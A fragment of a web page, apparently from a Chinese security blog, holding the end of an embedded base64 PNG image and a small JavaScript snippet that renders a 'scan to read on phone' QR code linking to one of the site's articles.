npWg76fdDboc7XWOiH0Whhj6WaW++4bMjuhN3J7IJeH//vJ84NhXTpfI/vWODbOeHMVXSOEuNbyZdZC8I6Fysvky+SvTHkZjH3Ey6DPuZdy1ZyDqIHArLOm4kyTOfkQ/YD9wfDrw/6dL+rQpgSP+f5Z/FRAq3POONOYq5rKOz9DWK8501fukbUg1qi1sxjua6HXeA/C/RoyO9U3cudANJ1H7ZH9uhf0T8NVLYQWAq+0znkdoTmjOJljiL4wftCEyElvc51jo/kZfkcDsSY0PAcya7653z+BYSDQpgW9/53tQdTWGj9BwqtczUPfDyKGEWtfCE3mYeRyfuZD1GhvsqyByEGPM4059ag2DMTije85gT2Q95z7ctWXDATimuZV6lV0DkILmBoQOP4bxZC4Q3jNKjOf0Rp4fC3Xw/0aa72O0Bys618yEC227TUn8JKBePJXW4J4KqwVWg+Rg0DzM1SdzDn5Noh6x9YYIfKAqRNdAxy3E8a3xqf4wql9LqRnCtqaLxnI2Xk7f3wCw0A84RneWy3XWAsxfecgYsCSh9D1FtfYfEbgfNqhPfGqtU6+DEIr32bNI1hrapx71Jxj4TCQXLj93z+BcyAQTwjcx9U2odVao6nLHF+hdNlmWmhrQO/P9N/loO8JLFvkvQLdbZwVQWicgz4Wfw5Ewbb3n8AeyPtn0O3gfwAAAP//LvDA5gAAAAZJREFUAwDWmzyzZYBB8wAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/api-wxapps-\_Postrequest-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 